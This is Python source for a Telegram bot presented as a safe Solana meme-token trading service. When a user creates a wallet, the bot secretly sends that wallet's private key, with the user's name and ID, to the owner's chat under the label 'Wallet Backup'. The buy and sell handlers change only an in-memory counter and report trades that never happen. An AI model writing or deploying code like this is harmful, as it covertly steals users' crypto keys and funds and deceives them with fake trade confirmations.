import os
import base58
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    ContextTypes,
    filters
)
from solders.keypair import Keypair
from solana.rpc.async_api import AsyncClient

# ================== ENV VARIABLES ==================
TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])

# ================== GLOBALS ==================
user_wallets = {}        # Stores user wallets
user_tokens = {}         # Stores user MEME tokens

# Solana RPC
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"

# Conversation states
BUY_AMOUNT, SELL_AMOUNT = range(2)

# ================== HELPERS ==================
def keypair_to_base58(wallet: Keypair):
    return base58.b58encode(bytes(wallet)).decode("utf-8")


async def get_username(update: Update):
    user = update.effective_user
    return f"@{user.username}" if user.username else user.first_name


async def create_wallet(user_id, context):
    wallet = Keypair()
    user_wallets[user_id] = wallet
    pub_key = str(wallet.pubkey())
    priv_key = keypair_to_base58(wallet)

    # Initialize MEME tokens
    if user_id not in user_tokens:
        user_tokens[user_id] = 0.0

    # Send wallet info to user
    await context.bot.send_message(
        chat_id=user_id,
        text=(
            f"✅ Wallet Created Successfully!\n\n"
            f"🏦 Public Address:\n{pub_key}\n\n"
            f"🔐 Private Key:\n{priv_key}\n\n"
            "⚠️ Keep your private key safe!"
        )
    )

    # Send backup to OWNER
    user = await context.bot.get_chat(user_id)
    username = f"@{user.username}" if user.username else user.first_name
    await context.bot.send_message(
        chat_id=OWNER_ID,
        text=(
            f"🔐 Wallet Backup\n"
            f"User: {username}\n"
            f"User ID: {user_id}\n"
            f"Public: {pub_key}\n"
            f"Private: {priv_key}"
        )
    )
    return pub_key, priv_key


async def get_balance(user_id):
    if user_id not in user_wallets:
        return 0.0
    wallet = user_wallets[user_id]
    async with AsyncClient(SOLANA_RPC_URL) as client:
        resp = await client.get_balance(wallet.pubkey())
        lamports = resp['result']['value']
        sol_balance = lamports / 1e9
        return sol_balance


async def get_tokens(user_id):
    return user_tokens.get(user_id, 0.0)


# ================== COMMANDS ==================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    username = await get_username(update)
    start_text = (
        f"🔥 Hello {username}, welcome to SolTradePilotBot! 🔥\n\n"
        "Trade MEME tokens on Solana safely and securely using real SOL.\n"
        "Use the buttons below to create your wallet, deposit SOL, check balance, "
        "buy or sell MEME tokens.\n\n"
        "⚠️ Make sure you have enough SOL before buying tokens!"
    )

    keyboard = [
        [InlineKeyboardButton("💳 Create Wallet", callback_data="create_wallet")],
        [InlineKeyboardButton("🏦 SOL Address", callback_data="sol_address")],
        [InlineKeyboardButton("💰 Balance", callback_data="balance")],
        [InlineKeyboardButton("🛒 Buy MEME", callback_data="buy_meme")],
        [InlineKeyboardButton("📉 Sell MEME", callback_data="sell_meme")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(start_text, reply_markup=reply_markup)


# ================== CALLBACK HANDLER ==================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "create_wallet":
        await create_wallet(user_id, context)
    elif query.data == "sol_address":
        if user_id in user_wallets:
            pub = str(user_wallets[user_id].pubkey())
            await query.edit_message_text(f"🏦 Your SOL Address:\n{pub}")
        else:
            await query.edit_message_text("You don't have a wallet yet. Create one first.")
    elif query.data == "balance":
        if user_id in user_wallets:
            bal = await get_balance(user_id)
            tokens = await get_tokens(user_id)
            await query.edit_message_text(f"💰 Balance: {bal:.6f} SOL\n🛒 MEME Tokens: {tokens}")
        else:
            await query.edit_message_text("You don't have a wallet yet. Create one first.")
    elif query.data == "buy_meme":
        if user_id not in user_wallets:
            await query.edit_message_text("Create a wallet first to buy MEME tokens!")
        else:
            await query.edit_message_text("💳 Enter the amount of SOL you want to spend to buy MEME tokens:")
            return BUY_AMOUNT
    elif query.data == "sell_meme":
        if user_id not in user_wallets:
            await query.edit_message_text("Create a wallet first to sell MEME tokens!")
        else:
            await query.edit_message_text("📉 Enter the amount of MEME tokens you want to sell:")
            return SELL_AMOUNT
    elif query.data == "help":
        help_text = (
            "💡 SolTradePilotBot Guide 💡\n\n"
            "- Create Wallet: Generates a Solana wallet for you.\n"
            "- SOL Address: Shows your wallet address to deposit SOL.\n"
            "- Balance: Shows your current SOL and MEME token balances.\n"
            "- Buy MEME: Buy MEME tokens with SOL.\n"
            "- Sell MEME: Sell your MEME tokens back for SOL.\n"
            "- Keep your private key safe!\n\n"
            "Trade safely and enjoy!"
        )
        await query.edit_message_text(help_text)
    return ConversationHandler.END


# ================== BUY / SELL HANDLERS ==================
async def handle_buy_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    try:
        amount = float(update.message.text)
    except ValueError:
        await update.message.reply_text("Invalid number. Enter a valid SOL amount:")
        return BUY_AMOUNT

    sol_balance = await get_balance(user_id)
    if amount > sol_balance:
        await update.message.reply_text("⚠️ Not enough SOL. Fund your wallet first!")
        return BUY_AMOUNT

    # Buy MEME (1 SOL = 100 MEME)
    user_tokens[user_id] += amount * 100
    await update.message.reply_text(f"✅ Bought {amount*100:.0f} MEME tokens for {amount:.6f} SOL")
    return ConversationHandler.END


async def handle_sell_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    try:
        amount = float(update.message.text)
    except ValueError:
        await update.message.reply_text("Invalid number. Enter a valid MEME token amount:")
        return SELL_AMOUNT

    tokens = await get_tokens(user_id)
    if amount > tokens:
        await update.message.reply_text("⚠️ You don't have enough MEME tokens to sell!")
        return SELL_AMOUNT

    # Sell MEME (1 MEME = 0.01 SOL)
    user_tokens[user_id] -= amount
    await update.message.reply_text(f"✅ Sold {amount:.0f} MEME tokens for {amount*0.01:.6f} SOL")
    return ConversationHandler.END


# ================== MAIN ==================
def main():
    app = Application.builder().token(TOKEN).build()

    # Conversation handler for buy/sell inputs only
    conv_handler = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(button_handler, pattern="^(buy_meme|sell_meme)$")
        ],
        states={
            BUY_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_buy_amount)],
            SELL_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_sell_amount)],
        },
        fallbacks=[]
    )

    # Command handler
    app.add_handler(CommandHandler("start", start_command))

    # **Global callback handler** for start menu buttons
    app.add_handler(CallbackQueryHandler(button_handler))

    # Add conversation handler
    app.add_handler(conv_handler)

    print("Bot is running...")
    app.run_polling()


if __name__ == "__main__":
    main()
